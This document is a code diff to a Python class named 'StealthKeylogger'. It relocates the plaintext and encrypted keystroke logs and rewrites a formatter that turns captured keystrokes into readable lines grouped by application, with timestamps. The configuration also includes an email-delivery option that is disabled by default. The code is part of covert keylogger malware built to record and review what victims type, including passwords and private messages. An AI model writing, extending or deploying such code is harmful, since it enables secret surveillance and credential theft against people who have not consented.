@@ -67,8 +67,8 @@ class StealthKeylogger:
     def load_config(self):
         """Load configuration from file"""
         default_config = {
-            "log_file": "keylog.txt",
-            "encrypted_log_file": "keylog.enc",
+            "log_file": "logs/keylog.txt",
+            "encrypted_log_file": "logs/keylog.enc",
             "email": {
                 "enabled": False,
                 "smtp_server": "smtp.gmail.com",
@@ -132,7 +132,9 @@ class StealthKeylogger:
     
     def setup_encryption(self):
         """Setup encryption for log files"""
-        key_file = "encryption.key"
+        # Ensure logs directory exists
+        os.makedirs('logs', exist_ok=True)
+        key_file = "logs/encryption.key"
         
         if os.path.exists(key_file):
             with open(key_file, 'rb') as f:
@@ -403,87 +405,111 @@ class StealthKeylogger:
         import re
         from datetime import datetime, timedelta
         
-        # Parse all timestamps and keys using regex
-        pattern = r'\[([^\]]+)\]\s*([^\[]*|\[[^\]]+\])'
-        matches = re.findall(pattern, log_content)
-        
-        if not matches:
-            return log_content  # Return original if parsing fails
-        
+        # Split content into lines for better processing
+        lines = log_content.split('\n')
         formatted_lines = []
-        current_line = ""
+        current_keystroke_line = ""
         current_time = ""
         last_timestamp = None
         
-        for timestamp, key_content in matches:
-            # Parse full timestamp to datetime for comparison
-            try:
-                current_dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
-                time_only = timestamp.split(' ')[1]
-            except:
-                time_only = timestamp
-                current_dt = None
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
             
-            # Clean up key content
-            key = key_content.strip()
+            # Check if this is an application context line
+            if '=== Application:' in line:
+                # Finish any current keystroke line before adding app context
+                if current_keystroke_line.strip():
+                    formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
+                    current_keystroke_line = ""
+                
+                # Extract timestamp and app info
+                timestamp_match = re.search(r'\[([^\]]+)\]', line)
+                app_match = re.search(r'=== Application: ([^=]+) ===', line)
+                
+                if timestamp_match and app_match:
+                    timestamp = timestamp_match.group(1)
+                    app_info = app_match.group(1).strip()
+                    formatted_lines.append("")  # Add spacing
+                    formatted_lines.append(f"🔄 [{timestamp}] Application: {app_info}")
+                    formatted_lines.append("─" * 50)
+                    current_time = timestamp.split(' ')[1] if ' ' in timestamp else timestamp
+                continue
             
-            # Check if there's a significant time gap (more than 10 seconds)
-            show_timestamp = False
-            if last_timestamp is None:
-                show_timestamp = True
-                current_time = time_only
-            elif current_dt and last_timestamp:
-                time_gap = (current_dt - last_timestamp).total_seconds()
-                if time_gap > 10:  # 10 seconds gap
+            # Parse regular keystroke entries
+            pattern = r'\[([^\]]+)\]\s*([^\[]*|\[[^\]]+\])'
+            matches = re.findall(pattern, line)
+            
+            for timestamp, key_content in matches:
+                # Parse timestamp
+                try:
+                    current_dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
+                    time_only = timestamp.split(' ')[1]
+                except:
+                    time_only = timestamp
+                    current_dt = None
+                
+                # Clean up key content
+                key = key_content.strip()
+                
+                # Check if there's a significant time gap (more than 10 seconds)
+                show_timestamp = False
+                if last_timestamp is None:
                     show_timestamp = True
-            
-            # If showing timestamp, finish current line and start new one
-            if show_timestamp and current_line.strip():
-                formatted_lines.append(f"[{current_time}] {current_line}")
-                current_line = ""
-                current_time = time_only
-            elif not current_time:
-                current_time = time_only
-            
-            # Handle different key types
-            if key == '[SPACE]':
-                current_line += " "
-            elif key == '[ENTER]':
-                if current_line.strip():
-                    formatted_lines.append(f"[{current_time}] {current_line}")
-                formatted_lines.append(f"--- <ENTER> ---")
-                current_line = ""
-                current_time = ""
-            elif key == '[TAB]':
-                current_line += " <TAB> "
-            elif key == '[BACKSPACE]':
-                if current_line and current_line[-1] != ' ':
-                    current_line = current_line[:-1]
-                else:
-                    current_line += " <BACKSPACE> "
-            elif key in ['[CTRL]', '[ALT]', '[SHIFT]']:
-                current_line += f" <{key[1:-1]}> "
-            elif key.startswith('[') and key.endswith(']'):
-                # Other special keys
-                current_line += f" <{key[1:-1]}> "
-            elif key:
-                # Regular character
-                current_line += key
-            
-            # Start new line after reasonable length or after special breaks
-            if len(current_line) > 100:
-                if current_line.strip():
-                    formatted_lines.append(f"[{current_time}] {current_line}")
-                current_line = ""
-                current_time = ""
-            
-            # Update last timestamp for gap detection
-            if current_dt:
-                last_timestamp = current_dt
+                    current_time = time_only
+                elif current_dt and last_timestamp:
+                    time_gap = (current_dt - last_timestamp).total_seconds()
+                    if time_gap > 10:  # 10 seconds gap
+                        show_timestamp = True
+                
+                # If showing timestamp, finish current line and start new one
+                if show_timestamp and current_keystroke_line.strip():
+                    formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
+                    current_keystroke_line = ""
+                    current_time = time_only
+                elif not current_time:
+                    current_time = time_only
+                
+                # Handle different key types
+                if key == '[SPACE]':
+                    current_keystroke_line += " "
+                elif key == '[ENTER]':
+                    if current_keystroke_line.strip():
+                        formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
+                    formatted_lines.append("--- <ENTER> ---")
+                    current_keystroke_line = ""
+                    current_time = ""
+                elif key == '[TAB]':
+                    current_keystroke_line += " <TAB> "
+                elif key == '[BACKSPACE]':
+                    if current_keystroke_line and current_keystroke_line[-1] != ' ':
+                        current_keystroke_line = current_keystroke_line[:-1]
+                    else:
+                        current_keystroke_line += " <BACKSPACE> "
+                elif key in ['[CTRL]', '[ALT]', '[SHIFT]']:
+                    current_keystroke_line += f" <{key[1:-1]}> "
+                elif key.startswith('[') and key.endswith(']'):
+                    # Other special keys
+                    current_keystroke_line += f" <{key[1:-1]}> "
+                elif key:
+                    # Regular character
+                    current_keystroke_line += key
+                
+                # Start new line after reasonable length
+                if len(current_keystroke_line) > 100:
+                    if current_keystroke_line.strip():
+                        formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
+                    current_keystroke_line = ""
+                    current_time = ""
+                
+                # Update last timestamp for gap detection
+                if current_dt:
+                    last_timestamp = current_dt
         
         # Add any remaining content
-        if current_line.strip():
-            formatted_lines.append(f"[{current_time}] {current_line}")
+        if current_keystroke_line.strip():
+            formatted_lines.append(f"[{current_time}] {current_keystroke_line.strip()}")
         
         return '\n'.join(formatted_lines) if formatted_lines else "No readable keystrokes found."
     
